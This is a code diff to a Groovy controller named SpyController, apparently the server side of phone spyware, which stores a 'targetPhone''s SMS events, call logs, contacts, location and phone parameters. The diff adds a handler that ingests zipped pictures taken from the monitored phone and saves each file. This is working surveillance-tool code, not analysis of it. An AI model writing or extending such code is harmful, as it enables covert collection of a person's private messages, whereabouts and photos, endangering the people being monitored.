@@ -12,6 +12,7 @@ import redis.clients.jedis.Jedis
 import com.org.krams.domain.UMetaData
 import com.xaviar.domain.CallLog
 import com.xaviar.domain.Contact
+import com.xaviar.domain.FileData;
 import com.xaviar.domain.Location
 import com.xaviar.domain.PhoneParams
 import com.xaviar.domain.Sms
@@ -22,14 +23,14 @@ import com.xaviar.market.rest.item.DataHolder
 class SpyController {
 
 	def redisService
-	def contactService
-	def locationService
-	def smsService
+//	def contactService
+//	def locationService
+//	def smsService
 	def userService
-	def callLogService
-	def phoneEventService
-	def smsEventService
-	def phoneParamsService
+//	def callLogService
+//	def phoneEventService
+//	def smsEventService
+//	def phoneParamsService
 
 	def createdata(DataHolder dataHolder) {
 
@@ -48,6 +49,7 @@ class SpyController {
 		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
 		String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
 		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
+		String clientPics = dataHolder.get(DataHolder.BIN_ZIP_PICTURES);
 
 		if (dataHolder.data != null) {
 
@@ -156,6 +158,16 @@ class SpyController {
 						List<Sms> smsEvents = mapper.readValue(clientSmsEvent,new TypeReference<List<Sms>>() {
 								});
 						smsEvents.each{ it.targetPhone=targetPhone;it.save(); }
+						//Sms.saveAll(smsEvents);
+						//smsEventService.createAll(smsEvents,uMetaData);
+					}
+					
+					
+					if (clientPics != null) {
+						mapper = new ObjectMapper();
+						List<FileData> clientPictures = mapper.readValue(clientPics,new TypeReference<List<FileData>>() {
+								});
+						clientPictures.each{it.save();}
 						//Sms.saveAll(smsEvents);
 						//smsEventService.createAll(smsEvents,uMetaData);
 					}
